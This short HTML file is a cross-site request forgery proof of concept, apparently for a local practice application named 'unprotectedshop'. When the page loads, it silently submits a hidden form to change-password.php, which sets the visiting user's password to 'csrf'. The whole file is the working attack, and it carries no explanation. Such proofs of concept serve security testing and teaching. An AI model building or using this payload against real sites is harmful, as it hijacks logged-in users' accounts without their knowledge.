<html>
<body onload="document.getElementById('f').submit()">
<form id="f" action="http://localhost/dashboard/unprotectedshop/change-password.php"
    method="post" name="chngpwd" type="hidden">
    <input type="password" name="newpass" value="csrf" required >
    <input type="password"  name="cnfpass" value="csrf" required >
</form>
</body>
</html>